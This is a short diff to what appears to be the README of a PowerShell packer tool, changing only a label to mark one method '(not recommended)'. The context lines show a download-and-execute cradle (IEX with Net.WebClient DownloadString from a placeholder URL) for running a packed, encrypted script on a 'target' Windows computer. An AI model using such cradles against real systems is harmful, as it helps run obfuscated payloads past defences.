@@ -29,7 +29,7 @@ PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\p
   - Step 2. Download & execute the packed & encrypted PowerShell script on a target Windows computer
 ```
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-script.ps1'); Invoke-method-of-your-original-script
---- or ---
+--- or (not recommended) ---
 PS C:\> WGET -URI https://URL/Packed-script.ps1 -OutFile C:\temp\Packed-script.ps1
 PS C:\> Import-Module C:\temp\Packed-script.ps1
 PS C:\> Invoke-method-of-your-original-script
